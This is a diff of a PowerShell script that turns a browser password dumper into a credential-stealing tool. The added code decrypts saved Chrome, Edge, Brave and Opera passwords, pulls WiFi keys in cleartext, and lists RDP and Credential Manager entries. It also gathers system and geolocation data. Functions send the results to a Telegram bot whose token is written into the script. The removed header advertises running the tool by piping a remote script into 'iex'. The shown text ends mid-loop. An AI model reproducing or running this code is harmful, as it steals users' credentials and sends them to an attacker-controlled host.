@@ -1,90 +1,16 @@
-#updated 
-# Browser Password Extractor - Fixed PowerShell Version
-# Usage: irm https://raw.githubusercontent.com/kalivarun/Script-Tools-/refs/heads/main/extract.txt | iex
+# USE THE BELOW COMMAND TO BYPASS SSL VALIDATION ERROR
+# [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-function Get-BrowserPasswords {
-    [CmdletBinding()]
-    param()
-    
-    $ErrorActionPreference = "Continue"
-    
-    # Create output directory
-    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-    $outputDir = "BrowserPasswords_$timestamp"
-    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
-    
-    $results = @{}
-    $totalPasswords = 0
-    
-    Write-Host "🌐 Browser Password Extractor" -ForegroundColor Green
-    Write-Host "==============================================" -ForegroundColor Yellow
-    Write-Host "Scanning browsers for saved passwords..." -ForegroundColor Cyan
-    Write-Host ""
-    
-    # Add DPAPI .NET types for decryption
-    Add-DPAPITypes
-    
-    # Scan browsers
-    $results["Chrome"] = Get-ChromePasswords
-    $results["Edge"] = Get-EdgePasswords
-    $results["Brave"] = Get-BravePasswords
-    $results["Opera"] = Get-OperaPasswords
-    
-    # Display Results
-    Write-Host ""
-    Write-Host "📋 EXTRACTION RESULTS" -ForegroundColor Green
-    Write-Host "==============================================" -ForegroundColor Yellow
-    
-    foreach ($browser in $results.Keys) {
-        $passwords = $results[$browser]
-        $totalPasswords += $passwords.Count
-        
-        if ($passwords.Count -gt 0) {
-            Write-Host ""
-            Write-Host "🖥️  $($browser.ToUpper()) ($($passwords.Count) passwords):" -ForegroundColor Cyan
-            Write-Host "----------------------------------------------" -ForegroundColor Gray
-            
-            for ($i = 0; $i -lt [Math]::Min($passwords.Count, 5); $i++) {
-                $pwd = $passwords[$i]
-                Write-Host "  $(($i+1)). 🌐 $($pwd.URL)" -ForegroundColor White
-                Write-Host "      👤 $($pwd.Username)" -ForegroundColor Gray
-                Write-Host "      🔑 $($pwd.Password)" -ForegroundColor Yellow
-            }
-            
-            if ($passwords.Count -gt 5) {
-                Write-Host "  ... and $($passwords.Count - 5) more passwords" -ForegroundColor Gray
-            }
-        }
-    }
-    
-    # Save to JSON files
-    Write-Host ""
-    Write-Host "💾 Saving results..." -ForegroundColor Cyan
-    
-    foreach ($browser in $results.Keys) {
-        $passwords = $results[$browser]
-        if ($passwords.Count -gt 0) {
-            $jsonFile = "$outputDir\$browser`_passwords.json"
-            $passwords | ConvertTo-Json -Depth 3 | Out-File -FilePath $jsonFile -Encoding UTF8
-            Write-Host "   ✅ $browser saved to: $jsonFile" -ForegroundColor Green
-        }
-    }
-    
-    # Save combined results
-    $combinedFile = "$outputDir\ALL_PASSWORDS.json"
-    $results | ConvertTo-Json -Depth 3 | Out-File -FilePath $combinedFile -Encoding UTF8
-    Write-Host "   ✅ Combined results saved to: $combinedFile" -ForegroundColor Green
-    
-    Write-Host ""
-    Write-Host "📊 SUMMARY: Found $totalPasswords total passwords" -ForegroundColor Green
-    Write-Host "📁 Output directory: $(Resolve-Path $outputDir)" -ForegroundColor Cyan
-    Write-Host ""
-    Write-Host "🎉 Extraction completed!" -ForegroundColor Green
-}
+# Enhanced Multi-Browser and Network Password Extraction with Password Decryption
+# Added DPAPI and AES-GCM decryption for browser passwords
 
-function Add-DPAPITypes {
-    # Add .NET types for DPAPI decryption
-    Add-Type -TypeDefinition @"
+param(
+    [string]$x = "8407278774:AAEXe4fMbmghWolLzuWIauW_X9CpKoxX82U",
+    [string]$y = "2047893044"  
+)
+
+# Add .NET types for DPAPI and AES decryption
+Add-Type -TypeDefinition @"
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -163,214 +89,885 @@ public class AESHelper {
     }
 }
 "@ -ReferencedAssemblies "System.Security.Cryptography.Algorithms"
-}
 
-function Get-ChromePasswords {
-    $browserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Chrome"
-}
-
-function Get-EdgePasswords {
-    $browserDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Edge"
-}
-
-function Get-BravePasswords {
-    $browserDataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Brave"
-}
-
-function Get-OperaPasswords {
-    $browserDataPath = "$env:APPDATA\Opera Software\Opera Stable"
-    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Opera"
-}
-
-function Get-ChromiumPasswords {
-    param(
-        [string]$BrowserPath,
-        [string]$BrowserName
-    )
-    
-    $passwords = @()
-    
-    Write-Host "🔍 Scanning $BrowserName..." -ForegroundColor Cyan
-    
-    if (-not (Test-Path $BrowserPath)) {
-        Write-Host "   ❌ $BrowserName not found" -ForegroundColor Red
-        return $passwords
+# Function to get public IP information
+function Get-PublicIPInfo {
+    try {
+        Write-Host "Getting public IP information..." -ForegroundColor Yellow
+        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
+        return @{
+            PublicIP = $ipInfo.ip
+            Country = $ipInfo.country
+            Region = $ipInfo.region
+            City = $ipInfo.city
+            Org = $ipInfo.org
+            Loc = $ipInfo.loc
+            Timezone = $ipInfo.timezone
+        }
+    } catch {
+        Write-Host "Failed to get public IP information: $($_.Exception.Message)" -ForegroundColor Red
+        return @{
+            PublicIP = "Unknown"
+            Country = "Unknown"
+            Region = "Unknown"
+            City = "Unknown"
+            Org = "Unknown"
+            Loc = "Unknown"
+            Timezone = "Unknown"
+        }
     }
+}
+
+# Function to get detailed system information
+function Get-DetailedSystemInfo {
+    $computerInfo = Get-ComputerInfo
+    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
+    $biosInfo = Get-WmiObject -Class Win32_BIOS
+    $processorInfo = Get-WmiObject -Class Win32_Processor
+    $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
     
-    # Get encryption key
-    $localStatePath = "$BrowserPath\Local State"
-    if (-not (Test-Path $localStatePath)) {
-        Write-Host "   ❌ Local State not found for $BrowserName" -ForegroundColor Red
-        return $passwords
+    return @{
+        ComputerName = $env:COMPUTERNAME
+        UserName = $env:USERNAME
+        OSName = $osInfo.Caption
+        OSVersion = $osInfo.Version
+        OSBuild = $osInfo.BuildNumber
+        BIOSSerial = $biosInfo.SerialNumber
+        Processor = $processorInfo.Name
+        ProcessorCores = $processorInfo.NumberOfCores
+        TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
+        SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
+        SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
+        LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
+        MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
     }
+}
+
+# Function to extract detailed WiFi information
+function Get-DetailedWiFiInfo {
+    Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
+    
+    $wifiProfiles = @()
+    $wifiInterfaces = @()
     
     try {
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        # Get WiFi interface information
+        $interfaceInfo = netsh wlan show interfaces
+        $interfaceDetails = @{}
+        $currentInterface = ""
         
-        # Remove DPAPI prefix (first 5 bytes)
-        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)]
-        
-        # Decrypt master key using DPAPI
-        $masterKey = [DPAPIHelper]::CryptUnprotectData($encryptedKey)
-        
-        if ($null -eq $masterKey) {
-            Write-Host "   ❌ Failed to decrypt master key for $BrowserName" -ForegroundColor Red
-            return $passwords
+        foreach ($line in $interfaceInfo) {
+            if ($line -match "^\s*Name\s*:\s*(.+)") {
+                $currentInterface = $matches[1].Trim()
+                $interfaceDetails[$currentInterface] = @{}
+            } elseif ($currentInterface -and $line -match "^\s*([^:]+)\s*:\s*(.+)") {
+                $key = $matches[1].Trim()
+                $value = $matches[2].Trim()
+                $interfaceDetails[$currentInterface][$key] = $value
+            }
         }
         
-        Write-Host "   ✅ Got encryption key for $BrowserName" -ForegroundColor Green
+        # Get all WiFi profiles
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+            $_.ToString().Split(":")[1].Trim()
+        }
         
-    } catch {
-        Write-Host "   ❌ Error getting encryption key for ${BrowserName}: $($_.Exception.Message)" -ForegroundColor Red
-        return $passwords
-    }
-    
-    # Process profiles
-    $profiles = @("Default")
-    $profileDirs = Get-ChildItem "$BrowserPath\Profile *" -Directory -ErrorAction SilentlyContinue
-    if ($profileDirs) {
-        $profiles += $profileDirs | Select-Object -ExpandProperty Name
-    }
-    
-    foreach ($profile in $profiles) {
-        $profilePath = "$BrowserPath\$profile"
-        $loginDataPath = "$profilePath\Login Data"
-        
-        if (Test-Path $loginDataPath) {
+        foreach ($profile in $profiles) {
             try {
-                Write-Host "   📁 Processing profile: $profile" -ForegroundColor Gray
+                # Get detailed WiFi profile information
+                $profileInfo = netsh wlan show profile name="$profile" key=clear
+                $profileDetails = @{}
                 
-                # Copy database to avoid locks
-                $tempDb = "$env:TEMP\${BrowserName}_${profile}_temp.db"
-                Copy-Item $loginDataPath $tempDb -Force
-                
-                # Use .NET to read SQLite database
-                $connectionString = "Data Source=$tempDb;Version=3;"
-                $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
-                $connection.Open()
-                
-                $command = $connection.CreateCommand()
-                $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
-                $dataset = New-Object System.Data.DataSet
-                $adapter.Fill($dataset) | Out-Null
-                
-                $table = $dataset.Tables[0]
-                
-                foreach ($row in $table.Rows) {
-                    $url = $row[0]
-                    $username = $row[1]
-                    $encryptedPassword = $row[2]
-                    
-                    if ($encryptedPassword -and $username -and $url) {
-                        $password = Decrypt-Password -EncryptedData $encryptedPassword -MasterKey $masterKey
-                        
-                        if ($password -and $password -notlike "*Failed*") {
-                            $passwords += [PSCustomObject]@{
-                                URL = $url
-                                Username = $username
-                                Password = $password
-                                Browser = $BrowserName
-                                Profile = $profile
-                            }
-                        }
+                foreach ($line in $profileInfo) {
+                    if ($line -match "^\s*([^:]+)\s*:\s*(.+)") {
+                        $key = $matches[1].Trim()
+                        $value = $matches[2].Trim()
+                        $profileDetails[$key] = $value
                     }
                 }
                 
-                $connection.Close()
-                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+                $password = $profileDetails["Key Content"]
+                $authentication = $profileDetails["Authentication"]
+                $encryption = $profileDetails["Cipher"]
                 
-                Write-Host "      ✅ Found $($passwords.Count) passwords in $profile" -ForegroundColor Green
-                
+                $wifiProfiles += @{
+                    SSID = $profile
+                    Password = if ($password) { $password } else { "No password" }
+                    Authentication = $authentication
+                    Encryption = $encryption
+                    ConnectionMode = $profileDetails["Connection mode"]
+                    SSIDName = $profileDetails["SSID name"]
+                    NetworkType = $profileDetails["Network type"]
+                    RadioType = $profileDetails["Radio type"]
+                    VendorExtension = $profileDetails["Vendor extension"]
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
             } catch {
-                Write-Host "      ❌ Error processing ${BrowserName} profile ${profile}: $($_.Exception.Message)" -ForegroundColor Red
+                Write-Host "Error processing WiFi profile $profile : $($_.Exception.Message)" -ForegroundColor Red
             }
         }
+        
+        # Get current connected WiFi information
+        $currentWifi = netsh wlan show interfaces | Where-Object { $_ -match "SSID" } | ForEach-Object {
+            if ($_ -match "SSID\s*:\s*(.+)") {
+                $matches[1].Trim()
+            }
+        }
+        
+        $wifiData = @{
+            Profiles = $wifiProfiles
+            Interfaces = $interfaceDetails
+            CurrentlyConnected = if ($currentWifi) { $currentWifi } else { "Not connected" }
+            TotalProfiles = $wifiProfiles.Count
+            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        }
+        
+        return $wifiData
+        
+    } catch {
+        Write-Host "Error extracting WiFi information: $($_.Exception.Message)" -ForegroundColor Red
+        return @{
+            Profiles = @()
+            Interfaces = @{}
+            CurrentlyConnected = "Error"
+            TotalProfiles = 0
+            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            Error = $_.Exception.Message
+        }
     }
-    
-    Write-Host "   ✅ ${BrowserName}: $($passwords.Count) total passwords" -ForegroundColor Green
-    return $passwords
 }
 
-function Decrypt-Password {
+# Function to extract RDP connection information
+function Get-RDPConnections {
+    Write-Host "Extracting RDP connection information..." -ForegroundColor Yellow
+    
+    $rdpConnections = @()
+    
+    try {
+        # Get RDP connection files from Documents
+        $rdpFiles = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.rdp" -ErrorAction SilentlyContinue
+        $rdpFiles += Get-ChildItem -Path "$env:USERPROFILE\Desktop" -Filter "*.rdp" -ErrorAction SilentlyContinue
+        
+        foreach ($rdpFile in $rdpFiles) {
+            try {
+                $content = Get-Content $rdpFile.FullName -ErrorAction Stop
+                $server = ($content | Where-Object { $_ -match "full address:s:" }) -replace "full address:s:", ""
+                $username = ($content | Where-Object { $_ -match "username:s:" }) -replace "username:s:", ""
+                
+                $rdpConnections += @{
+                    FileName = $rdpFile.Name
+                    Server = $server.Trim()
+                    UsernameHint = $username.Trim()
+                    FilePath = $rdpFile.FullName
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            } catch {
+                Write-Host "Error reading RDP file $($rdpFile.Name): $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        
+        # Check for saved credentials in Credential Manager
+        try {
+            $cmdkeyList = cmdkey /list 2>$null
+            $currentTarget = ""
+            
+            foreach ($line in $cmdkeyList) {
+                if ($line -match "Target:\s*(.+)") {
+                    $currentTarget = $matches[1].Trim()
+                } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
+                    $type = $matches[1].Trim()
+                    
+                    # Check if this is an RDP credential
+                    if ($currentTarget -like "TERMSRV/*" -or $currentTarget -like "MicrosoftAccount:target=TERMSRV/*") {
+                        $rdpConnections += @{
+                            FileName = "Credential Manager"
+                            Server = $currentTarget -replace "TERMSRV/", ""
+                            UsernameHint = "Saved in Credential Manager"
+                            Type = $type
+                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        }
+                    }
+                    $currentTarget = ""
+                }
+            }
+        } catch {
+            Write-Host "Error checking Credential Manager: $($_.Exception.Message)" -ForegroundColor Red
+        }
+        
+        Write-Host "Extracted $($rdpConnections.Count) RDP connections" -ForegroundColor Green
+        return $rdpConnections
+        
+    } catch {
+        Write-Host "Error extracting RDP connections: $($_.Exception.Message)" -ForegroundColor Red
+        return @()
+    }
+}
+
+# Function to extract Windows network credentials (RDP, VPN, etc.)
+function Get-WindowsNetworkCredentials {
+    Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
+    
+    $networkCredentials = @()
+    
+    try {
+        # Extract saved RDP credentials using cmdkey
+        $cmdkeyOutput = cmdkey /list 2>$null
+        
+        $currentTarget = ""
+        foreach ($line in $cmdkeyOutput) {
+            if ($line -match "Target:\s*(.+)") {
+                $currentTarget = $matches[1].Trim()
+            } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
+                $type = $matches[1].Trim()
+                
+                # Only include RDP/network related credentials
+                if ($currentTarget -like "TERMSRV/*" -or $currentTarget -like "MicrosoftAccount:target=TERMSRV/*" -or 
+                    $currentTarget -like "Domain:target=*" -or $currentTarget -like "LegacyGeneric:target=*") {
+                    $networkCredentials += @{
+                        Target = $currentTarget
+                        Type = $type
+                        CredentialType = "RDP/Windows"
+                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
+                }
+                $currentTarget = ""
+            }
+        }
+        
+        # Try to extract from Credential Manager (if available)
+        try {
+            $credentialFiles = Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\Microsoft\Credentials" -ErrorAction SilentlyContinue
+            foreach ($file in $credentialFiles) {
+                $networkCredentials += @{
+                    Target = $file.Name
+                    Type = "Encrypted Credential File"
+                    CredentialType = "Windows Vault"
+                    FilePath = $file.FullName
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            }
+        } catch {
+            Write-Host "Could not access Credential Manager files: $($_.Exception.Message)" -ForegroundColor Yellow
+        }
+        
+        Write-Host "Extracted $($networkCredentials.Count) Windows network credentials" -ForegroundColor Green
+        return $networkCredentials
+        
+    } catch {
+        Write-Host "Error extracting Windows network credentials: $($_.Exception.Message)" -ForegroundColor Red
+        return @()
+    }
+}
+
+# Function to send message to Telegram
+function Send-TelegramMessage {
     param(
-        [byte[]]$EncryptedData,
-        [byte[]]$MasterKey
+        [string]$Message
     )
     
-    if ($null -eq $EncryptedData -or $EncryptedData.Length -eq 0) {
+    try {
+        $uri = "https://api.telegram.org/bot$x/sendMessage"
+        $body = @{
+            chat_id = $y
+            text = $Message
+            parse_mode = "HTML"
+        }
+        
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
+        
+        if ($response.ok) {
+            Write-Host "✅ Message sent to Telegram" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
+            return $false
+        }
+    } catch {
+        Write-Host "❌ Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# Function to send files to Telegram
+function Send-TelegramFile {
+    param(
+        [string]$FilePath,
+        [string]$Caption
+    )
+    
+    try {
+        if (-not (Test-Path $FilePath)) {
+            Write-Host "File not found: $FilePath" -ForegroundColor Red
+            return $false
+        }
+        
+        # Wait for file to be fully written
+        $maxWaitTime = 30
+        $waitTime = 0
+        while ($waitTime -lt $maxWaitTime) {
+            try {
+                $file = Get-Item $FilePath
+                $fileSize = $file.Length
+                if ($fileSize -gt 0) {
+                    break
+                }
+            } catch {}
+            Start-Sleep -Seconds 1
+            $waitTime++
+        }
+        
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "",
+            $y,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"caption`"",
+            "",
+            $Caption,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Type: application/octet-stream",
+            "",
+            $fileContent,
+            "--$boundary--"
+        ) -join $LF
+
+        $uri = "https://api.telegram.org/bot$x/sendDocument"
+        Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
+        
+        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        
+        if ($response.ok) {
+            Write-Host "✅ File sent to Telegram successfully: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
+            return $false
+        }
+    } catch {
+        Write-Host "❌ Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# Function to install SQLite3 if needed
+function Install-SQLiteIfNeeded {
+    try {
+        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
+        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
+        $tempZip = "sqlite-temp.zip"
+        
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
+        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
+        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
+        
+        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
+        
+        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# Function to decrypt browser master key
+function Get-DecryptedMasterKey {
+    param(
+        [string]$BrowserDataPath,
+        [string]$BrowserName
+    )
+    
+    $localStatePath = Join-Path $BrowserDataPath "Local State"
+    
+    if (-not (Test-Path $localStatePath)) {
+        Write-Host "$BrowserName Local State file not found." -ForegroundColor Yellow
         return $null
     }
     
     try {
-        # Check if it's v10/v20 encrypted
-        if ($EncryptedData[0] -eq 118) { # 'v' character
-            if ($EncryptedData.Length -ge 31) {
-                # Try AES-GCM decryption
-                $decrypted = [AESHelper]::DecryptAESGCM($MasterKey, $EncryptedData)
-                if ($null -ne $decrypted) {
-                    return [System.Text.Encoding]::UTF8.GetString($decrypted)
-                }
-            }
+        Write-Host "Reading $BrowserName Local State file..." -ForegroundColor Yellow
+        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = $localStateContent.os_crypt.encrypted_key
+        
+        if (-not $encryptedKey) {
+            Write-Host "No encrypted key found in $BrowserName Local State" -ForegroundColor Yellow
+            return $null
+        }
+        
+        # Decode base64 encrypted key
+        $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
+        
+        # Remove DPAPI prefix (first 5 bytes: 'DPAPI')
+        if ($encryptedKeyBytes.Length -gt 5 -and [System.Text.Encoding]::ASCII.GetString($encryptedKeyBytes[0..4]) -eq "DPAPI") {
+            $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length-1)]
+        }
+        
+        # Decrypt using DPAPI
+        Write-Host "Decrypting $BrowserName master key using DPAPI..." -ForegroundColor Yellow
+        $decryptedKey = [DPAPIHelper]::CryptUnprotectData($encryptedKeyBytes)
+        
+        if ($decryptedKey) {
+            Write-Host "✅ Successfully decrypted $BrowserName master key" -ForegroundColor Green
+            return $decryptedKey
         } else {
-            # Try DPAPI decryption for older formats
-            $decrypted = [DPAPIHelper]::CryptUnprotectData($EncryptedData)
-            if ($null -ne $decrypted) {
-                return [System.Text.Encoding]::UTF8.GetString($decrypted)
+            Write-Host "❌ Failed to decrypt $BrowserName master key" -ForegroundColor Red
+            return $null
+        }
+        
+    } catch {
+        Write-Host "Error decrypting $BrowserName master key: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+# Function to decrypt browser password
+function Decrypt-BrowserPassword {
+    param(
+        [byte[]]$EncryptedPassword,
+        [byte[]]$MasterKey
+    )
+    
+    if ($null -eq $EncryptedPassword -or $EncryptedPassword.Length -eq 0) {
+        return "[Empty]"
+    }
+    
+    try {
+        # Check encryption version
+        if ($EncryptedPassword.Length >= 3) {
+            $prefix = [System.Text.Encoding]::ASCII.GetString($EncryptedPassword[0..2])
+            
+            if ($prefix -eq "v10" -or $prefix -eq "v20") {
+                # AES-GCM encryption
+                Write-Host "  Decrypting AES-GCM encrypted password..." -ForegroundColor Cyan
+                $decrypted = [AESHelper]::DecryptAESGCM($MasterKey, $EncryptedPassword)
+                if ($decrypted) {
+                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
+                    # Remove any padding or extra bytes
+                    $password = $password.TrimEnd([char]0)
+                    return $password
+                }
+            } else {
+                # DPAPI encryption (older Chrome versions)
+                Write-Host "  Decrypting DPAPI encrypted password..." -ForegroundColor Cyan
+                $decrypted = [DPAPIHelper]::CryptUnprotectData($EncryptedPassword)
+                if ($decrypted) {
+                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
+                    return $password
+                }
             }
         }
     } catch {
-        # Ignore decryption errors
+        Write-Host "  Decryption error: $($_.Exception.Message)" -ForegroundColor Red
     }
     
     return "[Decryption Failed]"
 }
 
-# Load System.Data.SQLite assembly
-try {
-    # Try to load SQLite from GAC or current directory
-    Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction Stop
-    Write-Host "✅ System.Data.SQLite loaded successfully" -ForegroundColor Green
-} catch {
-    Write-Host "⚠️  System.Data.SQLite not available. Trying alternative methods..." -ForegroundColor Yellow
+# Function to extract and decrypt browser passwords
+function Get-DecryptedBrowserPasswords {
+    param(
+        [string]$BrowserDataPath,
+        [string]$BrowserName
+    )
     
-    # Try to download and load SQLite
-    try {
-        $sqliteUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118"
-        $tempDir = "$env:TEMP\sqlite_temp"
-        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-        
-        Invoke-WebRequest -Uri $sqliteUrl -OutFile "$tempDir\sqlite.zip"
-        Expand-Archive -Path "$tempDir\sqlite.zip" -DestinationPath $tempDir -Force
-        
-        $dllPath = Get-ChildItem -Path $tempDir -Recurse -Filter "System.Data.SQLite.dll" | Select-Object -First 1
-        if ($dllPath) {
-            Add-Type -Path $dllPath.FullName
-            Write-Host "✅ System.Data.SQLite loaded from download" -ForegroundColor Green
-        }
-    } catch {
-        Write-Host "❌ Could not load System.Data.SQLite. Password extraction will not work." -ForegroundColor Red
-        Write-Host "💡 Install SQLite from: https://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki" -ForegroundColor Yellow
-        return
+    $decryptedPasswords = @()
+    
+    # Get decrypted master key
+    $masterKey = Get-DecryptedMasterKey -BrowserDataPath $BrowserDataPath -BrowserName $BrowserName
+    if (-not $masterKey) {
+        Write-Host "❌ Cannot decrypt passwords without master key for $BrowserName" -ForegroundColor Red
+        return $decryptedPasswords
     }
+    
+    # Find login data files
+    $loginDataFiles = @()
+    
+    # Check default profile
+    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
+    if (Test-Path $defaultLoginData) {
+        $loginDataFiles += @{ Path = $defaultLoginData; Profile = "Default" }
+    }
+    
+    # Check other profiles
+    $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue
+    foreach ($profileDir in $profileDirs) {
+        $loginDataPath = Join-Path $profileDir.FullName "Login Data"
+        if (Test-Path $loginDataPath) {
+            $loginDataFiles += @{ Path = $loginDataPath; Profile = $profileDir.Name }
+        }
+    }
+    
+    if ($loginDataFiles.Count -eq 0) {
+        Write-Host "No login database files found for $BrowserName." -ForegroundColor Yellow
+        return $decryptedPasswords
+    }
+    
+    Write-Host "Found $($loginDataFiles.Count) login database(s) for $BrowserName" -ForegroundColor Green
+    
+    foreach ($loginDataFile in $loginDataFiles) {
+        $dbPath = $loginDataFile.Path
+        $profileName = $loginDataFile.Profile
+        
+        Write-Host "  Processing profile: $profileName" -ForegroundColor Cyan
+        
+        try {
+            # Copy the database to avoid locking issues
+            $tempDbPath = "temp_${BrowserName}_$($profileName -replace '[^a-zA-Z0-9]', '_').db"
+            Copy-Item $dbPath $tempDbPath -Force
+            
+            # Query the database using SQLite
+            if (Test-Path ".\sqlite3.exe") {
+                $sqlitePath = ".\sqlite3.exe"
+            } else {
+                $sqlitePath = "sqlite3"
+            }
+            
+            $tempCsvPath = "temp_${BrowserName}_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
+            $query = "SELECT origin_url, username_value, password_value FROM logins;"
+            & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
+            
+            if (Test-Path $tempCsvPath) {
+                $logins = Import-Csv $tempCsvPath
+                Write-Host "    Found $($logins.Count) login entries" -ForegroundColor Green
+                
+                $counter = 0
+                $successfulDecryptions = 0
+                
+                foreach ($login in $logins) {
+                    $counter++
+                    
+                    if ($login.password_value -and $login.username_value -and $login.origin_url) {
+                        try {
+                            # Convert hex string to byte array
+                            $hexString = $login.password_value
+                            if ($hexString -match "^[0-9A-Fa-f]+$") {
+                                $encryptedBytes = [byte[]]::new($hexString.Length / 2)
+                                for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+                                    $encryptedBytes[$i / 2] = [Convert]::ToByte($hexString.Substring($i, 2), 16)
+                                }
+                                
+                                # Decrypt the password
+                                $decryptedPassword = Decrypt-BrowserPassword -EncryptedPassword $encryptedBytes -MasterKey $masterKey
+                                
+                                if ($decryptedPassword -ne "[Decryption Failed]" -and $decryptedPassword -ne "[Empty]") {
+                                    $successfulDecryptions++
+                                    
+                                    $decryptedPasswords += @{
+                                        Browser = $BrowserName
+                                        Profile = $profileName
+                                        URL = $login.origin_url
+                                        Username = $login.username_value
+                                        Password = $decryptedPassword
+                                        EncryptionVersion = if ($encryptedBytes.Length -ge 3) { 
+                                            [System.Text.Encoding]::ASCII.GetString($encryptedBytes[0..2]) 
+                                        } else { "Unknown" }
+                                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                                    }
+                                    
+                                    # Show first few successful decryptions
+                                    if ($successfulDecryptions -le 3) {
+                                        Write-Host "    ✅ Decrypted: $($login.origin_url) - $($login.username_value)" -ForegroundColor Green
+                                    }
+                                }
+                            }
+                        } catch {
+                            Write-Host "    ❌ Error decrypting entry: $($_.Exception.Message)" -ForegroundColor Red
+                        }
+                    }
+                    
+                    # Show progress
+                    if ($counter % 20 -eq 0 -and $counter -gt 0) {
+                        Write-Host "    Processed $counter entries, $successfulDecryptions decrypted..." -ForegroundColor Cyan
+                    }
+                }
+                
